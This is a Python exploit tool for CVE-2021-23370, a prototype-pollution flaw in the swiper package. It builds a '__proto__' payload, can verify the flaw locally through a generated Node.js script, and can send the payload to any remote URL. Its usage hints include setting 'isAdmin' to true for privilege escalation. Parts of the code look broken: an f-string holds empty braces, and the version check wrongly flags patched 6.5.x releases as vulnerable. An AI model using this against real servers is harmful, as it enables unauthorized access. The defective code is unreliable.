#!/usr/bin/env python3
# file: cve_2021_23370.py
# target: swiper < 6.5.1 (Node.js/Bun server-side)
# vulnerability: prototype pollution via swiper.default.extendDefaults()
# usage: python3 cve_2021_23370.py --help

import argparse
import json
import sys
import subprocess
import os
import tempfile

BANNER = """
[ALPHA] CVE-2021-23370 // swiper prototype pollution
        target: swiper < 6.5.1
        sink: swiper.default.extendDefaults()
"""

def check_swiper_version():
    """Verify local swiper installation is vulnerable."""
    try:
        result = subprocess.run(
            ["npm", "ls", "swiper", "--depth=0", "--json"],
            capture_output=True, text=True, timeout=10
        )
        data = json.loads(result.stdout)
        deps = data.get("dependencies", {})
        if "swiper" not in deps:
            print("[!] swiper not installed locally.")
            return None
        version = deps["swiper"].get("version", "unknown")
        print(f"[*] local swiper version: {version}")
        # crude check; proper semver comparison would need packaging
        if version.startswith("6.5.") or version.startswith("6.4.") or version.startswith("6.3."):
            print("[+] vulnerable range")
            return version
        else:
            print("[!] version may not be vulnerable (need < 6.5.1)")
            return version
    except Exception as e:
        print(f"[!] could not detect swiper: {e}")
        return None

def generate_local_js(payload_obj, output_path):
    """Write a Node.js validation script that runs the exploit locally."""
    js = f"""
const swiper = require('swiper');

const payload = {json.dumps(payload_obj)};

console.log("[*] before: {}.polluted =", {{}}.polluted);
swiper.default.extendDefaults(payload);
const after = {{}}.polluted;
console.log("[*] after:  {}.polluted =", after);

if (after === "HACKED") {{
    console.log("[+] VULNERABLE: Object.prototype polluted");
    process.exit(0);
}} else {{
    console.log("[-] not polluted (patched or sink not reached)");
    process.exit(1);
}}
"""
    with open(output_path, "w") as f:
        f.write(js)
    return output_path

def run_local(payload_obj):
    """Execute the exploit in a temp Node.js process."""
    tmpdir = tempfile.mkdtemp()
    js_path = os.path.join(tmpdir, "run.js")
    generate_local_js(payload_obj, js_path)
    print(f"[*] running local validation: {js_path}")
    result = subprocess.run(["node", js_path], capture_output=True, text=True, cwd=tmpdir)
    print(result.stdout)
    if result.stderr:
        print("[stderr]", result.stderr)
    return result.returncode == 0

def send_remote(url, payload_obj, method="POST", header=None, timeout=15):
    """Send the payload as JSON to a remote endpoint."""
    import urllib.request
    import urllib.error

    data = json.dumps(payload_obj).encode()
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if header:
        for h in header:
            k, v = h.split(":", 1)
            req.add_header(k.strip(), v.strip())

    print(f"[*] sending to {url} ...")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode(errors="replace")
            print(f"[*] status: {resp.status}")
            print(f"[*] body: {body[:500]}")
            return resp.status
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP {e.code}: {e.reason}")
        return e.code
    except Exception as e:
        print(f"[!] request failed: {e}")
        return None

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="CVE-2021-23370 swiper prototype pollution tool")
    parser.add_argument("--local", action="store_true", help="validate against local swiper installation")
    parser.add_argument("--url", help="remote target URL (e.g. http://target:3000/config)")
    parser.add_argument("--method", default="POST", help="HTTP method (default POST)")
    parser.add_argument("--prop", default="polluted", help="property name to pollute (default: polluted)")
    parser.add_argument("--value", default="HACKED", help="polluted value (default: HACKED)")
    parser.add_argument("--header", action="append", help="extra header 'Key: Value' (repeatable)")
    parser.add_argument("--check-version", action="store_true", help="check local swiper version only")
    args = parser.parse_args()

    payload = {"__proto__": {args.prop: args.value}}

    if args.check_version:
        check_swiper_version()
        return

    if args.local:
        check_swiper_version()
        ok = run_local(payload)
        sys.exit(0 if ok else 1)

    if args.url:
        send_remote(args.url, payload, args.method, args.header)
        return

    # default: print payload and usage hints
    print("[*] payload:")
    print(json.dumps(payload, indent=2))
    print("\n[*] examples:")
    print("    local validation:  python3 cve_2021_23370.py --local")
    print("    remote send:       python3 cve_2021_23370.py --url http://target:3000/config")
    print("    custom property:   python3 cve_2021_23370.py --url ... --prop isAdmin --value true")

if __name__ == "__main__":
    main()